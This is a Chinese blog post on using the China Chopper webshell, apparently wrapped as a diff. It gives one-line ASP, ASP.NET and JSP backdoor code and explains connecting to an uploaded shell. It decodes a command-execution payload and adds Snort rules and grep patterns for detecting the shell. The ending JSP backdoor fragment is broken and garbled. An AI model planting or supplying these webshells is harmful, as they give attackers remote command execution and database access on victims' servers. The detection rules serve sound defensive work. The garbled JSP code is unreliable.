@@ -1,0 +1,210 @@
+  中国菜刀使用方法以及小技巧
+Snow狼关注1人评论7278人阅读2017-03-31 18:46:31
+相信大多数的站长都用FTP来管理web空间，但是相对于菜刀来说FTP简直弱到爆.就数据库管理方面来说，phpmyadmin和帝国软件只能管理mysql数据库，而且在软件的体积上跟菜刀完全没法比，如果精通SQL语法，何必还要PHPMYADMIN呢？而且中国菜刀以其特×××形界面,支持MYSQL,MSSQL,ORACLE,INFOMIX,ACCESS，支持ADO方式连接的数据库。
+
+服务端：
+
+       在服务端运行的代码如下：
+
+PHP:
+
+ASP: <%eval request(“pass”)%>
+
+ASP.NET: <%@ Page Language=”Jscript”%><%eval(Request.Item["pass"],”unsafe”);%>
+
+JSP：<%if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(“\”)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());%>
+
+(注意: ASP.NET要单独一个文件或此文件也是Jscript语言)
+
+叉叉之前在上传漏洞演示，利用burpsuite抓包改包上传最后讲到用菜刀连接，看看是怎么实现的：
+
+           在主视图中右键/添加，在弹出的对话框中输入服务端地址，连接的密码(这个必须要)，选择正确的脚本类型和语言编码，保存后即可使用文件管理，虚拟终端，数据库管理三大块功能。要是其它都没错误，那么可能就是你把语言编码选错了.
+
+1. 文件管理：缓存下载目录，并支持离线查看缓存目录，上传下载修改文件
+
+2. 虚拟终端：人性化的设计，操作方便;(输入HELP查看更多用法)
+
+3. 数据库管理：图形界面,支持MYSQL,MSSQL,ORACLE,INFOMIX,ACCESS支持ADO方式连接的数据库。
+
+(各种脚本条件下的数据库连接方法请点击数据库管理界面左上角处的配置按钮查看)
+
+PHP脚本：
+
+类型 类型可为MYSQL,MSSQL,ORACLE,INFOMIX中的一种
+
+主机地址 主机地址可为机器名或IP地址，如localhost
+
+数据库用户 连接数据库的用户名，如root
+
+数据库密码
+
+连接数据库的密码，如123455
+
+ASP和ASP.NET脚本：
+
+类型 类型只能填ADO
+
+ADO配置信息
+
+ADO连接各种数据库的方式不一样。如MSSQL的配置信息为
+
+Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=123456
+
+4. 网站蜘蛛功能：织出一张网站的目录结构。下载的列表文件存在桌面，右键菜单/载入URL列表即可以根据地址得到目录结构
+
+ 
+
+ 
+
+ 
+
+中国菜刀上传的机制：
+
+                   通过WebDAV文件上传
+    
+                   通过JBoss jmx-console 或者Apache的Tomcat管理页面上传
+    
+                   远程代码执行下载
+    
+                   通过其他方式接入后传输
+
+其攻击payload的编码如下：
+
+Password=Response.Write("->|");
+
+var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System. Convert.FromBase64String("dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0luZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0luZyhSZXF1ZXN0Lkl0ZW1bInoyIl0pKTtlLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d75px9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D
+
+使用Fiddler的text wizard功能将其base64解码为明文varc=newSystem.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(65001).
+
+GetString(System.Convert.FromBase64String(Request.Item["z1"])));
+
+vare=newSystem.Diagnostics.Process();
+
+varout:System.IO.StreamReader,EI:System.IO.StreamReader;
+
+c.UseShellExecute=false;
+
+c.RedirectStandardOutput=true;c.RedirectStandardError=true;
+
+e.StartInfo=c;c.Arguments="/c"+System.Text.Encoding.GetEncoding(65001).
+
+GetString(System.Convert.FromBase64String(Request.Item["z2"]));
+
+e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();
+
+Response.Write(out.ReadToEnd()+EI.ReadToEnd());
+
+上面这段代码的意思是使用base64解码存储在z1、z2这两个参数中的数据。接下来我们来查看z1与z2对应的值。
+
+&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d75px9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D
+
+base64解码参数对应的值，如下所示：
+
+z1=cmdz2=cd /d "c:\inetpub\wwwroot\"&whoami&echo [S]&cd&echo [E]
+
+其中z1的值是cmd，z2的值是cd /d “c:\inetpub\wwwroot\”&whoami&echo [S]&cd&echo [E]。该操作的意思就是执行cmd命令，列出当前用户与当前目录，执行结果如下所示：
+
+->|nt authority\network service[S]C:\Inetpub\wwwroot[E]|<-
+
+now，我们知道中国菜刀的流量通信的特征，可以利用网络或主机级别的防护软件检测这种恶意通信。
+
+网络：
+
+可以利用Snort编写规则检测中国菜刀的流量，能够轻松的捕获到异常数据，Keith Tyler在他的博客中给出了一个基本的IDS规则：
+
+alert tcp any any -> any 80 ( sid:900001; content:"base64_decode";http_client_body;flow:to_server,established; content:"POST"; nocase;http_method; ;msg:"Webshell Detected Apache";)
+
+为了减少误报，我们将该段规则修改了下，只检测数据包内容中包含FromBase64String以及z1，如下：
+
+ 
+
+alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS
+
+(msg: "China Chopper with first Command Detected";
+
+flow:to_server,established; content: "FromBase64String";
+
+content: "z1"; content:"POST"; nocase;http_method;
+
+reference:url,http://www.fireeye.com/blog/technical/botnet-activities-research/2013/08/
+
+breaking-down-the-china-chopper-web-shell-part-i.html;
+
+classtype:web-application-attack; sid: 900000101;)
+
+以下规则更进一步优化，以下规则在数据包中查找FromBase64String，并且利用正则表达式匹配z后面任意一到三的数字组合，如Z1、Z10、Z100等。
+
+alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS
+
+(msg: "China Chopper with all Commands Detected"; flow:to_server,established;
+
+content: "FromBase64String"; content: "z"; pcre: "/Z\d{1,3}/i"; content:"POST"; nocase;http_method;
+
+reference:url,http://www.fireeye.com/blog/technical/botnet-activities-research/2013/08/
+
+breaking-down-the-china-chopper-web-shell-part-i.html;
+
+classtype:web-application-attack; sid: 900000102;)
+
+这些IDS特征都可以进一步优化，OK，我们了解了网络层面如何检测中国菜刀数据包，接下来介绍下如何通过主机级别的检测发现该数据包。
+
+主机：
+
+在Linux上最快最简单的方法查找中国菜刀，可以利用egrep+正则表达式识别被感染的文件，如下：
+
+egrep -re ' [<][?]php\s\@eval[(]\$_POST\[.+\][)];[?][>]' *.php
+
+egrep+正则表达式是一个强大的组合，国外安全研究者Ian Ahl编写了一些正则表达式教程，如下：
+
+regex basics
+
+Using regex with Notepad
+
+另外，Window提供了一种方法，通过findstr命令加上正则表达式搜索文件。如下：
+
+可以看到在Windows上正则表达式与linux略有区别，如下：
+
+ 
+
+findstr /R "[<][?]php.\@eval[(]\$_POST.*[)];[?][>]" *.php
+
+以上命令是查找PHP shell，如果要查找ASPX shell，只需修改正则表达式即可，如下：
+
+egrep -re '[<]\%\@\sPage\sLanguage=.Jscript.\%[>][<]\%eval.Request\.Item.+unsafe' *.aspx
+
+findstr /R "[<]\%\@.Page.Language=.Jscript.\%[>][<]\%eval.Request\.Item.*unsafe" *.aspx
+
+如果你要查找一些隐藏的PHP或ASPX文件，可以使用dir命令来，如下：
+
+dir /S /A /B *.php
+
+Findstr还可以搜索子目录：
+
+findstr /R /S "[<][?]php.\@eval[(]\$_POST.*[)];[?][>]" *.php
+
+ 
+
+ 
+
+记录一下JSP几种后门
+
+以下是服务端，保存成one.jsp并上传至目标服务器中。
+
+通过使用一句话木马客户端连接one.jsp木马。
+
+将下列代码保存为html页面：
+
+JSP一句话木马客户端
+
+专用JSP木马连接器
+
+服务端地址
+
+保存完成后，打开html页面，写入一句话木马服务端地址，    例如http://shenwolf.wap.zhanqunabc.cn/ ，写入需要的代码和保存的文件名称点击保存即服务器，使用中国菜刀工具进行连File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+"t");if(!s.substring(0,1).equals("/")){AA(sb);}}else if(Z.equals("B")){BB(z1,sb);}else if(Z.equals("C")){String l="";BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+"rn");}br.close();}else OutputStreamWriter(new {KK(z1,z2);sb.append("1");}else
+
+if(Z.equals("L")){LL(z1,z2);sb.append("1");}
+else if(Z.equals("M"))
+{String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);
+MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals("N")){NN(z1,sb);}
+else if(Z.equals("O")){OO(z1,sb);}else if(Z.equals("P")){PP(z1,sb);}
+else if(Z.equals("Q")){QQ(cs,z1,z2,sb);}}catch(Exception e){sb.append("ERROR"+":// "+e.toString());}sb.append("|"+"
